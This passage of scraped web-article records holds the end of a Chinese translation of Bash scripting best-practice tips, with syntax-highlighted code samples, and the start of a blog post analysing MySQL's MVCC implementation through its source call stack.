class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670f6e00e226190748-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670f6e00e226190748-1\"><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span> <span class=\"crayon-e\">file </span><span class=\"crayon-st\">in</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">`</span><span class=\"crayon-v\">ls</span><span class=\"crayon-sy\">`</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">do</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>前一个方式是可嵌套的，更易于阅读的，还能让一般的系统管理员群体感到满意。 不要使用反引号。</p>\n<p>8、 一致性是好的。 选择一种风格并在整个脚本中坚持下去。 显然，我喜欢人们选择 <code>$()</code> 语法而不是反引号，并将其变量包在花括号中。 我更喜欢人们使用两个或四个空格而不是制表符来缩进，但即使你选择了错误的方式，也要一贯地错下去。</p>\n<p>7、 为 Bash 脚本使用适当的<a href=\"https://linux.cn/article-3664-1.html\">释伴</a>shebang（LCTT 译注：<strong>Shebang</strong>，也称为 <strong>Hashbang</strong> ，是一个由井号和叹号构成的字符序列 <code>#!</code> ，其出现在文本文件的第一行的前两个字符。 在文件中存在释伴的情况下，类 Unix 操作系统的程序载入器会分析释伴后的内容，将这些内容作为解释器指令，并调用该指令，并将载有释伴的文件路径作为该解释器的参数）。 因为我正在编写Bash脚本，只打算用 Bash 执行它们，所以我经常使用 <code>#!/usr/bin/bash</code> 作为我的释伴。 不要使用 <code>#!/bin/sh</code> 或 <code>#!/usr/bin/sh</code>。 你的脚本会被执行，但它会以兼容模式运行——可能会产生许多意外的副作用。 （当然，除非你想要兼容模式。）</p>\n<p>6、 比较字符串时，在 <code>if</code> 语句中给变量加上引号是个好主意，因为如果你的变量是空的，Bash 会为这样的行抛出一个错误：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670f6e012391170150\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nif [ ${myvar} == \"foo\" ]; then\r\n  echo \"bar\"\r\nfi</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670f6e012391170150-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f6e012391170150-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f6e012391170150-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670f6e012391170150-1\"><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">$</span><span class=\"crayon-sy\">{</span><span class=\"crayon-v\">myvar</span><span class=\"crayon-sy\">}</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">==</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"foo\"</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">then</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f6e012391170150-2\"><span class=\"crayon-h\">  </span><span class=\"crayon-i\">echo</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"bar\"</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f6e012391170150-3\"><span class=\"crayon-v\">fi</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>对于这样的行，将判定为 <code>false</code>：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670f6e015492604591\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nif [ \"${myvar}\" == \"foo\" ]; then\r\n  echo \"bar\"\r\nfi</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670f6e015492604591-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f6e015492604591-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f6e015492604591-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670f6e015492604591-1\"><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"${myvar}\"</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">==</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"foo\"</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">then</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f6e015492604591-2\"><span class=\"crayon-h\">  </span><span class=\"crayon-i\">echo</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"bar\"</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f6e015492604591-3\"><span class=\"crayon-v\">fi</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>此外，如果你不确定变量的内容（例如，在解析用户输入时），请给变量加引号以防止解释某些特殊字符，并确保该变量被视为单个单词，即使它包含空格。</p>\n<p>5、 我想这是一个品味问题，但我更喜欢使用双等号（ <code>==</code> ），即使是比较 Bash 中的字符串。 这是一致性的问题，尽管对于字符串比较，只有一个等号会起作用，我的思维立即变为“单个 <code>=</code> 是一个赋值运算符！”</p>\n<p>4、 使用适当的退出代码。 确保如果你的脚本无法执行某些操作，则会向用户显示已写好的失败消息（最好提供解决问题的方法）并发送非零退出代码：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670f6e019913071701\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n# we have failed\r\necho \"Process has failed to complete, you need to manually restart the whatchamacallit\"\r\nexit 1</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670f6e019913071701-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f6e019913071701-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f6e019913071701-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670f6e019913071701-1\"><span class=\"crayon-p\"># we have failed</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f6e019913071701-2\"><span class=\"crayon-i\">echo</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"Process has failed to complete, you need to manually restart the whatchamacallit\"</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f6e019913071701-3\"><span class=\"crayon-i\">exit</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>这样可以更容易地以编程方式从另一个脚本调用你的脚本并验证其成功完成。</p>\n<p>3、 使用 Bash 的内置机制为变量提供合理的默认值，或者如果未定义你希望定义的变量，则抛出错误：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670f6e01f597637268\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n# this sets the value of $myvar to redhat, and prints 'redhat'\r\necho ${myvar:=redhat}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670f6e01f597637268-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f6e01f597637268-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670f6e01f597637268-1\"><span class=\"crayon-p\"># this sets the value of $myvar to redhat, and prints 'redhat'</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f6e01f597637268-2\"><span class=\"crayon-e\">echo</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">$</span><span class=\"crayon-sy\">{</span><span class=\"crayon-v\">myvar</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">=</span><span class=\"crayon-v\">redhat</span><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670f6e023213282225\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n# this throws an error reading 'The variable myvar is undefined, dear reader' if $myvar is undefined\r\n${myvar:?The variable myvar is undefined, dear reader}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670f6e023213282225-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f6e023213282225-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670f6e023213282225-1\"><span class=\"crayon-p\"># this throws an error reading 'The variable myvar is undefined, dear reader' if $myvar is undefined</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f6e023213282225-2\"><span class=\"crayon-sy\">$</span><span class=\"crayon-sy\">{</span><span class=\"crayon-v\">myvar</span><span class=\"crayon-o\">:</span><span class=\"crayon-sy\">?</span><span class=\"crayon-e\">The </span><span class=\"crayon-e\">variable </span><span class=\"crayon-e\">myvar </span><span class=\"crayon-st\">is</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">undefined</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">dear </span><span class=\"crayon-v\">reader</span><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0007 seconds] -->\r\n<p>2、 特别是如果你正在编写大型脚本，或者是如果你与其他人一起开发该大型脚本，请考虑在函数内部定义变量时使用 <code>local</code> 关键字。 <code>local</code> 关键字将创建一个局部变量，该变量只在该函数中可见。 这限制了变量冲突的可能性。</p>\n<p>1、 每个系统管理员有时必须这样做：在控制台上调试一些东西，可能是数据中心的真实服务器，也可能是虚拟化平台的虚拟服务器。 如果你必须以这种方式调试脚本，你会感谢你自己记住了这个：不要让你的脚本中的行太长！</p>\n<p>在许多系统上，控制台的默认宽度仍为 80 个字符。 如果你需要在控制台上调试脚本并且该脚本有很长的行，那么你将成为一个悲伤的熊猫。 此外，具有较短行的脚本—— 默认值仍为 80 个字符——在普通编辑器中也更容易阅读和理解！</p>\n<p>我真的很喜欢 Bash。 我可以花几个小时写这篇文章或与其他爱好者交流优秀的技巧。 就希望你们能在评论中留下赞美。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114280\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114280votetotal\">2</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114280\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 1 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_path": "full/11683e584e6ecc31d0566e0bd45230c6d558da23.jpg"}
{"title": "MySQL多版本并发控制机制(MVCC)-源码浅析", "url": "http://blog.jobbole.com/114273/", "create_date": "2018/08/15", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2017/01/e4ff41fe57fa22949c5909f50e5b2ca6.jpg"], "url_object_id": "a06260514a21a9150242de58e87e956c", "praise_nums": 1, "fav_nums": 1, "comment_nums": 0, "tags": "IT技术,MySQL,并发", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"https://my.oschina.net/alchemystar/blog/1927425?tdsourcetag=s_pcqq_aiomsg\">无毁的湖光-Al </a>   </div><div id=\"articleContent\">\n<h2>前言</h2>\n<p>作为一个数据库爱好者，自己动手写过简单的SQL解析器以及存储引擎，但感觉还是不够过瘾。&lt;&lt;事务处理-概念与技术&gt;&gt;诚然讲的非常透彻，但只能提纲挈领，不能让你玩转某个真正的数据库。感谢cmake,能够让我在mac上用xcode去debug MySQL,从而能去领略它的各种实现细节。<br>\n笔者一直对数据库的隔离性很好奇，此篇博客就是我debug MySQL过程中的偶有所得。<br>\n(注:本文的MySQL采用的是MySQL-5.6.35版本)</p>\n<h2>MVCC(多版本并发控制机制)</h2>\n<p>隔离性也可以被称作并发控制、可串行化等。谈到并发控制首先想到的就是锁，MySQL通过使用两阶段锁的方式实现了更新的可串行化，同时为了加速查询性能，采用了MVCC(Multi Version Concurrency Control)的机制，使得不用锁也可以获取一致性的版本。</p>\n<h3>Repeatable Read</h3>\n<p>MySQL的通过MVCC以及(Next-Key Lock)实现了可重复读(Repeatable Read),其思想(MVCC)就是记录数据的版本变迁，通过精巧的选择不同数据的版本从而能够对用户呈现一致的结果。如下图所示:<br>\n<img src=\"http://jbcdn2.b0.upaiyun.com/2018/08/1f04c84dff7fe310dfb435059d55fe2f.png\" alt=\"\"><br>\n上图中，(A=50|B=50)的初始版本为1。<br>\n1.事务t1在select A时候看到的版本为1，即A=50<br>\n2.事务t2对A和B的修改将版本升级为2,即A=0,B=100<br>\n3.事务t1再此select B的时候看到的版本还是1, 即B=50<br>\n这样就隔离了版本的影响，A+B始终为100。</p>\n<h3>Read Commit</h3>\n<p>而如果不通过版本控制机制，而是读到最近提交的结果的话，则隔离级别是read commit,如下图所示:<br>\n<img src=\"http://jbcdn2.b0.upaiyun.com/2018/08/f26dfea2372bf3036d6525dff2f4e986.png\" alt=\"\"><br>\n在这种情况下，就需要使用锁机制(例如select for update)将此A,B记录锁住，从而获得正确的一致结果,如下图所示：<br>\n<img src=\"http://jbcdn2.b0.upaiyun.com/2018/08/060ea60e39ba0606b8cbc2d07a73a3f0.png\" alt=\"\"></p>\n<h3>MVCC的优势</h3>\n<p>当我们要对一些数据做一些只读操作来检查一致性，例如检查账务是否对齐的操作时候，并不希望加上对性能损耗很大的锁。这时候MVCC的一致性版本就有很大的优势了。</p>\n<h3>MVCC(实现机制)</h3>\n<p>本节就开始谈谈MVCC的实现机制,注意MVCC仅仅在纯select时有效(不包括select for update,lock in share mode等加锁操作,以及updateinsert等)。</p>\n<h3>select运行栈</h3>\n<p>首先我们追踪一下一条普通的查询sql在mysql源码中的运行过程,sql为(select * from test); <img src=\"http://jbcdn2.b0.upaiyun.com/2018/08/2ba3a2d6d89f56b7f037184ca866ca70.png\" alt=\"\"><br>\n其运行栈为:</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670167e56472539565\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nhandle_one_connection  MySQL的网络模型是one request one thread\r\n |-do_handle_one_connection\r\n\t|-do_command\r\n\t\t|-dispatch_command\r\n\t\t\t|-mysql_parse\t解析SQL\r\n\t\t\t\t|-mysql_execute_command\r\n\t\t\t\t\t|-execute_sqlcom_select\t执行select语句\r\n\t\t\t\t\t\t|-handle_select\r\n\t\t\t\t\t\t\t...一堆parse join 等的操作，当前并不关心\r\n\t\t\t\t\t\t\t|-*tab-&gt;read_record.read_record 读取记录\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670167e56472539565-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670167e56472539565-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab670167e56472539565-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670167e56472539565-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab670167e56472539565-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670167e56472539565-6\">6</div><div class=\"crayon-num\" 